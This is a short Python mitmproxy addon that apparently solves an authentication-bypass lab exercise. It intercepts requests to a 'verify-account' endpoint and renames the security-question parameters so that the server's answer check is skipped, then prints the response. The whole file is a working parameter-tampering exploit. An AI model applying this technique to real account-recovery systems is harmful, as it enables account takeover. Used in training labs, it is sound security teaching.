from urllib import parse
import collections


from mitmproxy import http
from mitmproxy import ctx

def request(flow: http.HTTPFlow) -> None:
    if 'auth-bypass/verify-account' in flow.request.url:
      params = dict(parse.parse_qsl(flow.request.content))
      params[b'secQuestion2'] = params[b'secQuestion0']
      params[b'secQuestion3'] = params[b'secQuestion1']
      del params[b'secQuestion0']
      del params[b'secQuestion1']
      flow.request.content = parse.urlencode(params).encode('utf-8')
def response(flow: http.HTTPFlow) -> None:
    if 'auth-bypass/verify-account' in flow.request.url:
      print(flow.response.content)
